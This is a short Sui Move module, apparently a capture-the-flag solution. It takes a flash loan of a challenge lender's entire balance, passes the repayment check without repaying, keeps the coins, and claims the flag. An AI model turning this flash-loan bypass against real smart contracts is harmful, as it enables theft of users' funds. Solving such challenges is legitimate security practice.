module ctf_wcw::hack { 
    use sui::coin::Coin;
    use sui::transfer;
    use sui::tx_context::{Self, TxContext};
    use movectf::flash::{Self, FlashLender, Receipt, FLASH};

    fun loan_all_coin(leader: &mut FlashLender, ctx: &mut TxContext) {
        let owner = tx_context::sender(ctx);

        let balance = flash::balance(leader, ctx);
        let (loan, receipt):(Coin<FLASH>, Receipt) = flash::loan(leader, balance, ctx);
        flash::check(leader, receipt);

        transfer::transfer(loan, owner);
    }

    public entry fun get_flag(leader: &mut FlashLender, ctx: &mut TxContext) {
        loan_all_coin(leader, ctx);
        flash::get_flag(leader, ctx);
    }
}